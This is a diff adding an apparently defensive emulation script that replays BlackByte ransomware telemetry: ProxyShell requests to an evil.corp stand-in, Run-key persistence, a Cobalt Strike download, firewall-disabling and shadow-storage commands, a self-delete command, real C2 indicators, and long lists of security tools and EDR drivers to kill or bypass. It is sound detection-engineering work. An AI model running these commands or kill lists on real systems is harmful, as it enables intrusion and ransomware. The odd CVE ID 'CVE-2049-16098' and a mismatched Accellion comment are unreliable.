@@ -1,0 +1,1941 @@
+title "BlackByte Threat Group Behavior"
+description "BlackByte 2.0 Ransomware Abuses Vulnerable Windows Driver to Disable Security Solutions believed to be an offshoot of the now-discontinued Conti group, is part of the big game cybercrime crews which zeroes in on large, high-profile targets as part of its ransomware-as-a-service (RaaS) scheme. BlackByte is the latest ransomware family to embrace the BYOVD method to achieve its goals."
+
+reference "https://www.microsoft.com/en-us/security/blog/2023/07/06/the-five-day-job-a-blackbyte-ransomware-intrusion-case-study/"
+reference "https://www.ic3.gov/Media/News/2022/220211.pdf"
+reference "https://cloud.google.com/blog/topics/threat-intelligence/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers/"
+
+author "Detecteam"
+status "development"
+# createOn : 2023/07/06
+# lastModified : 2023/07/09
+# tested : -----
+
+#####################
+
+tag "mitre-attack = T1041"
+tag "mitre-attack = T1059.003"
+tag "mitre-attack = T1210"
+
+section global_variables "__hidden__" {
+    $detecteam_category = [
+        "exploiter",
+        "backdoor",
+        "exfiltration",
+        "c2"
+    ]
+    $detecteam_detectability = "medium"
+
+
+    $computer.name = "beachhead"
+    $user.name = "johndoe"
+    $cidr_range = "192.168.1.0/24"
+    $server.name = "server"
+    $server.ip = "192.168.1.254"
+    $admin_id = "administrator"
+    $admin_password = random.string(8)
+    $exchange_server = "93.184.215.14"
+    $attacker_domain = "evil.corp"
+    $attacker_source = "185.225.73.44" # MISP event UUID a9eb9e8e-d894-4f36-a6c2-ca8142f72d29, tlp:clear
+
+    $detecteam.platform = "Win"
+
+    $blackbyte_paths = [
+        """C:\SystemData\wEFT.exe""",
+        """C:\SystemData\schillerized.exe"""
+    ]
+
+    $blackbyte = random($blackbyte_paths)
+
+    # Format: Registry key|Value name|Value data
+    $reg_key_playloads = [
+        """HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run|MsEdgeMsE|rundll32 C:\Users\user\Downloads\api-msvc.dll,Default""",
+        """HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run|MsEdgeMsE|rundll32 C:\temp\api-msvc.dll,Default""",
+        """HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run|MsEdgeMsE|rundll32 C:\systemtest\api-system.png,Default"""
+    ]
+
+    $files_created_hashes = [
+        "api-msvc.dll|SHA-256:4a066569113a569a6feb8f44257ac8764ee8f2011765009fdfd82fe3f4b92d3e",
+        "api-system.png|unknown",
+        "sys.exe|SHA-256:5f37b85687780c089607670040dbb3da2749b91b8adc0aa411fd6280b5fa7103"
+
+    ]
+
+    $anydesk_remote_access_tool = [
+        """C:\systemtest\anydesk\AnyDesk.exe""",
+        """C:\Program Files (x86)\AnyDesk\AnyDesk.exe""",
+        """C:\Scripts\AnyDesk.exe"""
+    ]
+
+    $anydesk_path = random($anydesk_remote_access_tool)
+
+    $net_discovery_tools = [
+        "netscan.exe|SHA-256:1b9badb1c646a19cdf101ac4f6fdd23bc61eaab8c9f925eb41848cea9fd0738e",
+        "netapp.exe|SHA-256:1b9badb1c646a19cdf101ac4f6fdd23bc61eaab8c9f925eb41848cea9fd0738e",
+        "AdFind.exe|SHA-256: f157090fd3ccd4220298c06ce8734361b724d80459592b10ac632acc624f455e"
+    ]
+
+    $steal_tools = [
+        "ExByte",
+        "Mimikatz"
+    ]
+
+    # explorer.exe -> ExByte
+    $exfiltration_command = "explorer.exe P@$$w0rd"
+
+    $exfiltration_logs_path = """C:\Exchange\MSExchLog.log"""
+
+    # The binaries require an 8-digit key number to encrypt files.
+    $encryption_execs = [
+        "wEFT.exe",
+        "schillerized.exe"
+    ]
+
+    $encryption_commands = [
+        "wEFT.exe -s",
+        "wEFT.exe -a"
+    ]
+
+    $files_after_encryption = [
+        """C:\SystemData\M8yl89s7.exe""",
+        """C:\SystemData\wEFT.exe""",
+        """C:\SystemData\MsExchangeLog1.log""",
+        """C:\SystemData\rENEgOtiAtES""",
+        """C:\SystemData\iHu6c4.ico""",
+        """C:\SystemData\BB_Readme_file.txt""",
+        """C:\SystemData\skip_bypass.txt"""
+    ]
+
+    $ransomware_note_file = """C:\SystemData\BB_Readme_file.txt"""
+
+    $delete_command = """cmd.exe /c ping 1.1.1.1 -n 10 > Nul & Del ${blackbyte} /F /Q"""
+
+
+}
+
+# SEC 1 - How does it start ?  Initial Access & Privilege Escalation
+# Exploding ProxyShell vulnerabilities on unpatched Exchange Servers
+# No actions here for detection
+tactic "Initial Access"
+section exchange_proxyshell_vulnerability "Exploitation of unpatched Exchange Servers" {
+    $attack_queries_get = ["?&Email=autodiscover/autodiscover.json%3F@evil.corp", "ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"]
+    $attack_queries_post = ["autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@evil.corp", "mapi/emsmdb?&Email=autodiscover/autodiscover.json%3F@evil.corp"]
+    $destination.ip = $exchange_server
+    $source.ip = $attacker_source
+    loop $attack_queries_get as $query {
+	step ProxyshellAttackGet {
+	    $http.request.method = "GET"
+	    $url.path = "/autodiscover/autodiscover.json?@${attacker_domain}/${query}"
+	    
+	    run HTTPConnection
+	}
+	sleep 0.1
+    }
+    loop $attack_queries_post as $query {
+	step ProxyshellAttackPost {
+	    $http.request.method = "POST"
+	    $url.path = "/autodiscover/autodiscover.json?@${attacker_domain}/${query}"
+	    
+	    run HTTPConnection
+	}
+	sleep 0.1
+    }
+
+    sleep 1
+    step ProxyshellExploit2 {
+	$http.request.method = "POST"
+	$b64data = base64.encode("Our proxyshell string")
+	$url.path = "/autodiscover/autodiscover.json?a=abcde@${attacker_domain}/?X-Rps-CAT=${b64data}"
+
+	run HTTPConnection
+    }
+}
+
+# SEC 2 - Persistence and C2
+# Create registry run keys to deploy a backdoor that collects and sends system information to a C2 channel
+# Leverages Cobalt Strike Beacon for persistence and C2 communications
+# Leverages the AnyDesk remote admin tool for persistence and lateral movement
+
+section persistence_and_c2 "Persistence: Create registry run keys" {
+
+    loop $reg_key_playloads as $new_reg_key {
+        step reg_key_creation {
+            $process.name = "reg.exe"
+            $reg_key_data = string.split($new_reg_key,"|")
+            $registry.hive = "HKEY_CURRENT_USER"
+            $registry.key = $reg_key_data[1]
+            $registry.data = $reg_key_data[2]
+            $registry.value = $reg_key_data[3]
+            action Windows.Registry.Create
+        }
+        
+        sleep 1
+
+    }
+
+    # Download Cobalt Strike Beacon
+    step download_csb_http_connection {
+        $destination.domain = "temp.sh"
+        $protocol = 443
+        $url.path = "/szAyn/sys.exe"
+        $http.request.method = "GET"
+        run HTTPConnection
+    }
+    
+    sleep 1
+
+    step csb_file_created {
+        $file.name = "sys.exe"
+        action File.Create
+    }
+    
+    sleep 1
+
+    $random_beacon_connections = random.int(10,200)
+    loop $random_beacon_connections {
+        step tcp_beacon_connections {
+            $destination.ip = "109.206.243.59"
+            $destination.port = "443"
+            run TCPHandshake
+        }
+        sleep 1
+    }
+
+    step anydesk_installed { 
+        $file.path = $anydesk_path
+        action File.Create
+    }
+    sleep 1
+}
+
+# SEC 3 - NetScan and Adfind are used to reconnaissance and network enumeration
+
+section reconnaissance_and_network_enumeration "NetScan and Adfind are used" {
+
+    $total_netscans = random.int(10,200)
+    loop $total_netscans {
+        step netscans_executions { 
+            $process.name = "netscan.exe"
+            action Process.Start
+        }
+        sleep 1
+    }
+
+    $total_netapp = random.int(10,200)
+    loop $total_netapp {
+        step netscans_executions { 
+            $process.name = "netapp.exe"
+            action Process.Start
+        }
+        sleep 1
+    }
+
+    $total_adfind = random.int(10,200)
+    loop $total_adfind {
+        step netscans_executions { 
+            $process.name = "AdFind.exe"
+            action Process.Start
+        }
+        sleep 1
+    }
+
+}
+
+# SEC 4 - Credential Access
+# Additional privileged account credentials are stolen, likely using Mimikatz
+
+section credential_access "Mimikatz stole account credentials" {
+
+    step mimikatz_process {
+        $process.name = "mimikatz.exe"
+        action Process.Start
+    }
+
+    sleep 0.1 
+
+    step mimikatz_1st_execution {
+        $file.name = "mimikatz.log"
+        action File.Create
+    }
+
+    sleep 0.1 
+
+    $total_mimikatz = random.int(5,50)
+    loop $total_mimikatz {
+        step mimikatz_executions {
+            $file.name = "mimikatz.log"
+            action File.Open
+        }
+        
+        sleep 0.1 
+    }
+
+}
+
+# SEC 5 - Lateral movement
+# Compromised domain admin credentials are used with RDP and PowerShell Remoting to access doamin controllers and other environment servers
+
+section lateral_movement "Lateral movement: credentials are used" {
+
+    $total_rdp_connections = random.int(10,120)
+    loop $total_rdp_connections {
+        step rdp_connections {
+            $last_range = random.int(1, 253)
+            $destination.ip = ip.cidr($cidr_range, $last_range)
+            action RDP.LoginSuccess
+        }
+        sleep 1
+    }
+
+}
+
+# SEC 6 - Data staging & exfiltration
+# ExByte collects and exfiltrates files from target network
+
+section data_staging_exfiltration "Data staging & exfiltration: ExByte" {
+
+    $total_exfiltrations = random.int(50,300)
+    loop $total_exfiltrations {
+        step exbyte_execution {
+            $process.name = "explorer.exe"
+            $process.command_line = $exfiltration_command
+            action Process.Start
+        }
+        sleep 0.1
+        
+        step log_list_files_and_metadata {
+            $file.path = $exfiltration_logs_path
+            action File.Create
+        }
+        sleep 0.1
+        
+        step data_file_created {
+            $file.name = "data.txt"
+            action File.Create
+        }
+        sleep 0.1
+
+        step exbyte_process_check_drive {
+            $file.path = """\\.\PHYSICALDRIVE0:"""
+            action File.Open
+        }
+        sleep 0.1
+
+        step data_file_accessed {
+            $file.name = "data.txt"
+            action File.Open
+        }
+        sleep 0.1
+
+        # Mega NZ API access
+        step mega_nz_connection {
+            $destination.domain = "g.api.mega.co.nz"
+            $protocol = 443
+            $url.path = "/cs?id=1674017543"
+            run HTTPConnection
+        }
+
+        sleep 300 # 5 minutes for exfiltration tasks before delete data.txt
+
+        # data.txt deleted when Exbyte finishes
+        step data_file_deleted {
+            $file.name = "data.txt"
+            action File.Delete
+        }
+        sleep 1
+
+    }
+}
+
+# SEC 7 - Data encryption and destruction: Impact
+# BlackByte 2.0 ransomware deployed, encrypting devices across the environment
+
+section data_encryption_and_destruction "BlackByte 2.0 ransomware deployed" {
+
+    $total_encryptions = random.int(10,40)
+    loop $total_encryptions {
+
+        step blackbyte_encryption {
+            $process.name = $blackbyte
+            action Process.Start
+        }
+        sleep 0.2
+
+        step ransomware_files_created {
+            $file.path = random($files_after_encryption)
+            action File.Create
+        }
+        sleep 0.2
+    }
+
+    step antivirus_bypass_file_created {
+        $file.name = "rENEgOtiAtES"
+        action File.Create
+    }
+    sleep 0.1
+
+    # BlackByte binary then creates and starts a service named RABAsSaa
+    step service_rabassaa_created {
+        # RABAsSaa
+        $file.name = "rENEgOtiAtES"
+        action File.Open
+    }
+    sleep 0.1
+
+    $blackbyte_actions = [
+        """cmd /c netsh advfirewall set allprofiles state off""",
+        """cmd /c netsh advfirewall firewall set rule group=”File and Printer Sharing” new enable=Yes""",
+        """cmd /c netsh advfirewall firewall set rule group=”Network Discovery” new enable=Yes""",
+        """cmd /c vssadmin Resize ShadowStorge /For=B:\ /On=B:\ /MaxSize=401MB""",
+        """cmd /c vssadmin Resize ShadowStorage /For=B:\ /On=B:\ /MaxSize=UNBOUNDED""",
+        """cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f""",
+        """cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f""",
+        """cmd /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f"""
+    ]
+    loop $blackbyte_actions as $blackbyte_cmd {
+        step blackbyte_command {
+            $process.parent.command_line = $blackbyte
+            $process.command_line = $blackbyte_cmd
+            action Process.Start
+        }
+    }
+    sleep 0.1
+
+    step ransomware_note_file_created {
+        $file.path = $ransomware_note_file
+        action File.Create
+    }
+
+    # Invokes svchost.exe, injects to it to complete device encryption, and self-deletes by executing the following command
+    step blackbyte_self_deletes {
+        # $process.parent.name = "svchost.exe"
+        $process.command_line = $delete_command
+        action Process.Start
+    }
+    
+}
+
+#################################
+#    Indicators Of Compromise   #
+#################################
+
+section ioc "__hidden__" {
+    # Accellion File Transfer Appliance (FTA) vulnerabilities
+    # The threat actor was observed exploiting the ProxyShell vulnerabilities on unpatched Microsoft Exchange Servers
+    $vulns_list = [
+        "CVE-2021-34473",
+        "CVE-2021-34523",
+        "CVE-2021-31207",
+        "CVE-2049-16098"
+    ]
+
+    # MITRE ATT&CK Techniques
+    $mitre_att_ck_ttps = [
+        "T1003.002",
+        "T1012",
+        "T1018",
+        "T1033",
+        "T1036.005",
+        "T1053.005",
+        "T1055",
+        "T1057",
+        "T1059.001",
+        "T1069.001",
+        "T1069.002",
+        "T1074.001",
+        "T1078.003",
+        "T1083",
+        "T1087.002",
+        "T1204.002",
+        "T1518.001",
+        "T1543.003",
+        "T1562.001"
+    ]
+
+    $mitre_att_info = [
+        "Security Account Manager|T1003.002",
+        "Query Registry|T1012",
+        "Remote System Discovery|T1018",
+        "System Owner/User Discovery|T1033",
+        "Match Legitimate Name or Location|T1036.005",
+        "Scheduled Task|T1053.005",
+        "Process Injection|T1055",
+        "Process Discovery|T1057",
+        "PowerShell|T1059.001",
+        "Local Groups|T1069.001",
+        "Domain Groups|T1069.002",
+        "Local Data Staging|T1074.001",
+        "Valid Accounts|T1078.003",
+        "File and Directory Discovery|T1083",
+        "Domain Account|T1087.002",
+        "Malicious File|T1204.002",
+        "Security Software Discovery|T1518.001",
+        "Windows Service|T1543.003",
+        "Disable or Modify Tools|T1562.001"
+    ]
+
+    $microsoft_detections = [
+        """Trojan:Win32/Kovter!MSR""",
+        """Trojan:Win64/WinGoObfusc.LK!MT""",
+        """Trojan:Win64/BlackByte!MSR""",
+        """HackTool:Win32/AdFind!MSR""",
+        """Trojan:Win64/CobaltStrike!MSR"""
+    ]
+
+
+    $malware_c2_servers = [
+        "185.225.73.244",
+        "109.206.243.59"
+    ]
+
+    $malware_c2_channels = [
+        "https://myvisit.alteksecurity.org/t",
+        "https://temp.sh/szAyn/sys.exe",
+        "https://g.api.mega.co.nz",
+        "https://g.api.mega.co.nz/cs?id=1674017543"
+
+    ]
+
+    $file_hashes = [
+        "4a066569113a569a6feb8f44257ac8764ee8f2011765009fdfd82fe3f4b92d3e",
+        "5f37b85687780c089607670040dbb3da2749b91b8adc0aa411fd6280b5fa7103",
+        "01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd",
+        "ba3ec3f445683d0d0407157fda0c26fd669c0b8cc03f21770285a20b3133098f",
+        "1b9badb1c646a19cdf101ac4f6fdd23bc61eaab8c9f925eb41848cea9fd0738e",
+        "f157090fd3ccd4220298c06ce8734361b724d80459592b10ac632acc624f455e"
+    ]
+
+    $extensions_affected = [
+        ".4dd",
+        ".4dl",
+        ".accdb",
+        ".accdc",
+        ".accde",
+        ".accdr",
+        ".accdt",
+        ".accft",
+        ".adb",
+        ".ade",
+        ".adf",
+        ".adp",
+        ".arc",
+        ".ora",
+        ".alf",
+        ".ask",
+        ".btr",
+        ".bdf",
+        ".cat",
+        ".cdb",
+        ".ckp",
+        ".cma",
+        ".cpd",
+        ".dacpac",
+        ".dad",
+        ".dadiagrams",
+        ".daschema",
+        ".db",
+        ".db-shm",
+        ".db-wal",
+        ".db3",
+        ".dbc",
+        ".dbf",
+        ".dbs",
+        ".dbt",
+        ".dbv",
+        ".dbx",
+        ".dcb",
+        ".dct",
+        ".dcx",
+        ".ddl",
+        ".dlis",
+        ".dp1",
+        ".dqy",
+        ".dsk",
+        ".dsn",
+        ".dtsx",
+        ".dxl",
+        ".eco",
+        ".ecx",
+        ".edb",
+        ".epim",
+        ".exb",
+        ".fcd",
+        ".fdb",
+        ".fic",
+        ".fmp",
+        ".fmp12",
+        ".fmpsl",
+        ".fol",
+        ".fp3",
+        ".fp4",
+        ".fp5",
+        ".fp7",
+        ".fpt",
+        ".frm",
+        ".gdb",
+        ".grdb",
+        ".gwi",
+        ".hdb",
+        ".his",
+        ".ib",
+        ".idb",
+        ".ihx",
+        ".itdb",
+        ".itw",
+        ".jet",
+        ".jtx",
+        ".kdb",
+        ".kexi",
+        ".kexic",
+        ".kexis",
+        ".lgc",
+        ".lwx",
+        ".maf",
+        ".maq",
+        ".mar",
+        ".masmav",
+        ".mdb",
+        ".mpd",
+        ".mrg",
+        ".mud",
+        ".mwb",
+        ".myd",
+        ".ndf",
+        ".nnt",
+        ".nrmlib",
+        ".ns2",
+        ".ns3",
+        ".ns4",
+        ".nsf",
+        ".nv",
+        ".nv2",
+        ".nwdb",
+        ".nyf",
+        ".odb",
+        ".ogy",
+        ".orx",
+        ".owc",
+        ".p96",
+        ".p97",
+        ".pan",
+        ".pdb",
+        ".pdm",
+        ".pnz",
+        ".qry",
+        ".qvd",
+        ".rbf",
+        ".rctd",
+        ".rod",
+        ".rodx",
+        ".rpd",
+        ".rsd",
+        ".sas7bdat",
+        ".sbf",
+        ".scx",
+        ".sdb",
+        ".sdc",
+        ".sdf",
+        ".sis",
+        ".spg",
+        ".sql",
+        ".sqlite",
+        ".sqlite3",
+        ".sqlitedb",
+        ".te",
+        ".temx",
+        ".tmd",
+        ".tps",
+        ".trc",
+        ".trm",
+        ".udb",
+        ".udl",
+        ".usr",
+        ".v12",
+        ".vis",
+        ".vpd",
+        ".vvv",
+        ".wdb",
+        ".wmdb",
+        ".wrk",
+        ".xdb",
+        ".xld",
+        ".xmlff",
+        ".abcddb",
+        ".abs",
+        ".abx",
+        ".accdw",
+        ".and",
+        ".db2",
+        ".fm5",
+        ".hjt",
+        ".icg",
+        ".icr",
+        ".kdb",
+        ".lut",
+        ".maw",
+        ".mdn",
+        ".mdt"        
+    ]
+
+    $process_terminated = [
+        "teracopy",
+        "teamviewer",
+        "nsservice",
+        "nsctrl",
+        "uranium",
+        "processhacker",
+        "procmon",
+        "pestudio",
+        "procmon64",
+        "x32dbg",
+        "x64dbg",
+        "cff explorer",
+        "procexp",
+        "pslist",
+        "tcpview",
+        "tcpvcon",
+        "dbgview",
+        "rammap",
+        "rammap64",
+        "vmmap",
+        "ollydbg",
+        "autoruns",
+        "autorunssc",
+        "filemon",
+        "regmon",
+        "idaq",
+        "idaq64",
+        "immunitydebugger",
+        "wireshark",
+        "dumpcap",
+        "hookexplorer",
+        "importrec",
+        "petools",
+        "lordpe",
+        "sysinspector",
+        "proc_analyzer",
+        "sysanalyzer",
+        "sniff_hit",
+        "windbg",
+        "joeboxcontrol",
+        "joeboxserver",
+        "resourcehacker",
+        "fiddler",
+        "httpdebugger",
+        "dumpit",
+        "rammap",
+        "rammap64",
+        "vmmap",
+        "agntsvc",
+        "cntaosmgr",
+        "dbeng50",
+        "dbsnmp",
+        "encsvc",
+        "infopath",
+        "isqlplussvc",
+        "mbamtray",
+        "msaccess",
+        "msftesql",
+        "mspub",
+        "mydesktopqos",
+        "mydesktopservice",
+        "mysqld",
+        "mysqld-nt",
+        "mysqld-opt",
+        "Ntrtscan",
+        "ocautoupds",
+        "ocomm",
+        "ocssd",
+        "onenote",
+        "oracle",
+        "outlook",
+        "PccNTMon",
+        "powerpnt",
+        "sqbcoreservice",
+        "sql",
+        "sqlagent",
+        "sqlbrowser",
+        "sqlservr",
+        "sqlwriter",
+        "steam",
+        "synctime",
+        "tbirdconfig",
+        "thebat",
+        "thebat64",
+        "thunderbird",
+        "tmlisten",
+        "visio",
+        "winword",
+        "wordpad",
+        "xfssvccon",
+        "zoolz"        
+    ]
+
+    $services_terminated = [
+        "CybereasonRansomFree",
+        "vnetd",
+        "bpcd",
+        "SamSs",
+        "TeraCopyService",
+        "msftesql",
+        "nsService",
+        "klvssbridge64",
+        "vapiendpoint",
+        "ShMonitor",
+        "Smcinst",
+        "SmcService",
+        "SntpService",
+        "svcGenericHost",
+        "Swi_",
+        "TmCCSF",
+        "tmlisten",
+        "TrueKey",
+        "TrueKeyScheduler",
+        "TrueKeyServiceHelper",
+        "WRSVC",
+        "McTaskManager",
+        "OracleClientCache80",
+        "mfefire",
+        "wbengine",
+        "mfemms",
+        "RESvc",
+        "mfevtp",
+        "sacsvr",
+        "SAVAdminService",
+        "SepMasterService",
+        "PDVFSService",
+        "ESHASRV",
+        "SDRSVC",
+        "FA_Scheduler",
+        "KAVFS",
+        "KAVFS_KAVFSGT",
+        "kavfsslp",
+        "klnagent",
+        "macmnsvc",
+        "masvc",
+        "MBAMService",
+        "MBEndpointAgent",
+        "McShield",
+        "audioendpointbuilder",
+        "Antivirus",
+        "AVP",
+        "DCAgent",
+        "bedbg",
+        "EhttpSrv",
+        "MMS",
+        "ekrn",
+        "EPSecurityService",
+        "EPUpdateService",
+        "ntrtscan",
+        "EsgShKernel",
+        "msexchangeadtopology",
+        "AcrSch2Svc",
+        "MSOLAP$TPSAMA",
+        "Intel(R) PROSet Monitoring",
+        "msexchangeimap4",
+        "ARSM",
+        "unistoresvc_1af40a",
+        "ReportServer$TPS",
+        "MSOLAP$SYSTEM_BGC",
+        "W3Svc",
+        "MSExchangeSRS",
+        "ReportServer$TPSAMA",
+        "Zoolz 2 Service",
+        "MSOLAP$TPS",
+        "aphidmonitorservice",
+        "SstpSvc",
+        "MSExchangeMTA",
+        "ReportServer$SYSTEM_BGC",
+        "Symantec System Recovery",
+        "UI0Detect",
+        "MSExchangeSA",
+        "MSExchangeIS",
+        "ReportServer",
+        "MsDtsServer110",
+        "POP3Svc",
+        "MSExchangeMGMT",
+        "SMTPSvc",
+        "MsDtsServer",
+        "IisAdmin",
+        "MSExchangeES",
+        "EraserSvc11710",
+        "Enterprise Client Service",
+        "MsDtsServer100",
+        "NetMsmqActivator",
+        "stc_raw_agent",
+        "VSNAPVSS",
+        "PDVFSService",
+        "AcrSch2Svc",
+        "Acronis",
+        "CASAD2DWebSvc",
+        "CAARCUpdateSvc",
+        "McAfee",
+        "avpsus",
+        "DLPAgentService",
+        "mfewc",
+        "BMR Boot Service",
+        "DefWatch",
+        "ccEvtMgr",
+        "ccSetMgr",
+        "SavRoam",
+        "RTVsc screenconnect",
+        "ransom",
+        "sqltelemetry",
+        "msexch",
+        "vnc",
+        "teamviewer",
+        "msolap",
+        "veeam",
+        "backup",
+        "sql",
+        "memtas",
+        "vss",
+        "sophos",
+        "svc$",
+        "mepocs",
+        "wuauserv"        
+    ]
+
+    $drivers_bypassed = [
+        "360avflt.sys",
+        "360box.sys",
+        "360fsflt.sys",
+        "360qpesv.sys",
+        "5nine.cbt.sys",
+        "a2acc.sys",
+        "a2acc64.sys",
+        "a2ertpx64.sys",
+        "a2ertpx86.sys",
+        "a2gffi64.sys",
+        "a2gffx64.sys",
+        "a2gffx86.sys",
+        "aaf.sys",
+        "aalprotect.sys",
+        "abrpmon.sys",
+        "accessvalidator.sys",
+        "acdriver.sys",
+        "acdrv.sys",
+        "adaptivaclientcache32.sys",
+        "adaptivaclientcache64.sys",
+        "adcvcsnt.sys",
+        "adspiderdoc.sys",
+        "aefilter.sys",
+        "agentrtm64.sys",
+        "agfsmon.sys",
+        "agseclock.sys",
+        "agsyslock.sys",
+        "ahkamflt.sys",
+        "ahksvpro.sys",
+        "ahkusbfw.sys",
+        "ahnrghlh.sys",
+        "aictracedrv_am.sys",
+        "airship-filter.sys",
+        "ajfsprot.sys",
+        "alcapture.sys",
+        "alfaff.sys",
+        "altcbt.sys",
+        "amfd.sys",
+        "amfsm.sys",
+        "amm6460.sys",
+        "amm8660.sys",
+        "amsfilter.sys",
+        "amznmon.sys",
+        "antileakfilter.sys",
+        "antispyfilter.sys",
+        "anvfsm.sys",
+        "apexsqlfilterdriver.sys",
+        "appcheckd.sys",
+        "appguard.sys",
+        "appvmon.sys",
+        "arfmonnt.sys",
+        "arta.sys",
+        "arwflt.sys",
+        "asgard.sys",
+        "ashavscan.sys",
+        "asiofms.sys",
+        "aswfsblk.sys",
+        "aswmonflt.sys",
+        "aswsnx.sys",
+        "aswsp.sys",
+        "aszfltnt.sys",
+        "atamptnt.sys",
+        "atc.sys",
+        "atdragent.sys",
+        "atdragent64.sys",
+        "aternityregistryhook.sys",
+        "atflt.sys",
+        "atrsdfw.sys",
+        "auditflt.sys",
+        "aupdrv.sys",
+        "avapsfd.sys",
+        "avc3.sys",
+        "avckf.sys",
+        "avfsmn.sys",
+        "avgmfi64.sys",
+        "avgmfrs.sys",
+        "avgmfx64.sys",
+        "avgmfx86.sys",
+        "avgntflt.sys",
+        "avgtpx64.sys",
+        "avgtpx86.sys",
+        "avipbb.sys",
+        "avkmgr.sys",
+        "avmf.sys",
+        "awarecore.sys",
+        "axfltdrv.sys",
+        "axfsysmon.sys",
+        "ayfilter.sys",
+        "b9kernel.sys",
+        "backupreader.sys",
+        "bamfltr.sys",
+        "bapfecpt.sys",
+        "bbfilter.sys",
+        "bd0003.sys",
+        "bddevflt.sys",
+        "bdfiledefend.sys",
+        "bdfilespy.sys",
+        "bdfm.sys",
+        "bdfsfltr.sys",
+        "bdprivmon.sys",
+        "bdrdfolder.sys",
+        "bdsdkit.sys",
+        "bdsfilter.sys",
+        "bdsflt.sys",
+        "bdsvm.sys",
+        "bdsysmon.sys",
+        "bedaisy.sys",
+        "bemk.sys",
+        "bfaccess.sys",
+        "bfilter.sys",
+        "bfmon.sys",
+        "bhdrvx64.sys",
+        "bhdrvx86.sys",
+        "bhkavka.sys",
+        "bhkavki.sys",
+        "bkavautoflt.sys",
+        "bkavsdflt.sys",
+        "blackbirdfsa.sys",
+        "blackcat.sys",
+        "bmfsdrv.sys",
+        "bmregdrv.sys",
+        "boscmflt.sys",
+        "bosfsfltr.sys",
+        "bouncer.sys",
+        "boxifier.sys",
+        "brcow_x_x_x_x.sys",
+        "brfilter.sys",
+        "brnfilelock.sys",
+        "brnseclock.sys",
+        "browsermon.sys",
+        "bsrfsflt.sys",
+        "bssaudit.sys",
+        "bsyaed.sys",
+        "bsyar.sys",
+        "bsydf.sys",
+        "bsyirmf.sys",
+        "bsyrtm.sys",
+        "bsysp.sys",
+        "bsywl.sys",
+        "bwfsdrv.sys",
+        "bzsenspdrv.sys",
+        "bzsenth.sys",
+        "bzsenyaradrv.sys",
+        "caadflt.sys",
+        "caavfltr.sys",
+        "cancelsafe.sys",
+        "carbonblackk.sys",
+        "catflt.sys",
+        "catmf.sys",
+        "cbelam.sys",
+        "cbfilter20.sys",
+        "cbfltfs4.sys",
+        "cbfsfilter2017.sys",
+        "cbfsfilter2020.sys",
+        "cbsampledrv.sys",
+        "cdo.sys",
+        "cdrrsflt.sys",
+        "cdsgfsfilter.sys",
+        "centrifyfsf.sys",
+        "cfrmd.sys",
+        "cfsfdrv",
+        "cgwmf.sys",
+        "change.sys",
+        "changelog.sys",
+        "chemometecfilter.sys",
+        "ciscoampcefwdriver.sys",
+        "ciscoampheurdriver.sys",
+        "ciscosam.sys",
+        "clumiochangeblockmf.sys",
+        "cmdccav.sys",
+        "cmdcwagt.sys",
+        "cmdguard.sys",
+        "cmdmnefs.sys",
+        "cmflt.sys",
+        "code42filter.sys",
+        "codex.sys",
+        "conduantfsfltr.sys",
+        "containermonitor.sys",
+        "cpavfilter.sys",
+        "cpavkernel.sys",
+        "cpepmon.sys",
+        "crexecprev.sys",
+        "crncache32.sys",
+        "crncache64.sys",
+        "crnsysm.sys",
+        "cruncopy.sys",
+        "csaam.sys",
+        "csaav.sys",
+        "csacentr.sys",
+        "csaenh.sys",
+        "csagent.sys",
+        "csareg.sys",
+        "csascr.sys",
+        "csbfilter.sys",
+        "csdevicecontrol.sys",
+        "csfirmwareanalysis.sys",
+        "csflt.sys",
+        "csmon.sys",
+        "cssdlp.sys",
+        "ctamflt.sys",
+        "ctifile.sys",
+        "ctinet.sys",
+        "ctrpamon.sys",
+        "ctx.sys",
+        "cvcbt.sys",
+        "cvofflineflt32.sys",
+        "cvofflineflt64.sys",
+        "cvsflt.sys",
+        "cwdriver.sys",
+        "cwmem2k64.sys",
+        "cybkerneltracker.sys",
+        "cylancedrv64.sys",
+        "cyoptics.sys",
+        "cyprotectdrv32.sys",
+        "cyprotectdrv64.sys",
+        "cytmon.sys",
+        "cyverak.sys",
+        "cyvrfsfd.sys",
+        "cyvrlpc.sys",
+        "cyvrmtgn.sys",
+        "datanow_driver.sys",
+        "dattofsf.sys",
+        "da_ctl.sys",
+        "dcfafilter.sys",
+        "dcfsgrd.sys",
+        "dcsnaprestore.sys",
+        "deepinsfs.sys",
+        "delete_flt.sys",
+        "devmonminifilter.sys",
+        "dfmfilter.sys",
+        "dgedriver.sys",
+        "dgfilter.sys",
+        "dgsafe.sys",
+        "dhwatchdog.sys",
+        "diflt.sys",
+        "diskactmon.sys",
+        "dkdrv.sys",
+        "dkrtwrt.sys",
+        "dktlfsmf.sys",
+        "dnafsmonitor.sys",
+        "docvmonk.sys",
+        "docvmonk64.sys",
+        "dpmfilter.sys",
+        "drbdlock.sys",
+        "drivesentryfilterdriver2lite.sys",
+        "drsfile.sys",
+        "drvhookcsmf.sys",
+        "drvhookcsmf_amd64.sys",
+        "drwebfwflt.sys",
+        "drwebfwft.sys",
+        "dsark.sys",
+        "dsdriver.sys",
+        "dsfemon.sys",
+        "dsflt.sys",
+        "dsfltfs.sys",
+        "dskmn.sys",
+        "dtdsel.sys",
+        "dtpl.sys",
+        "dwprot.sys",
+        "dwshield.sys",
+        "dwshield64.sys",
+        "eamonm.sys",
+        "easeflt.sys",
+        "easyanticheat.sys",
+        "eaw.sys",
+        "ecatdriver.sys",
+        "edevmon.sys",
+        "ednemfsfilter.sys",
+        "edrdrv.sys",
+        "edrsensor.sys",
+        "edsigk.sys",
+        "eectrl.sys",
+        "eetd32.sys",
+        "eetd64.sys",
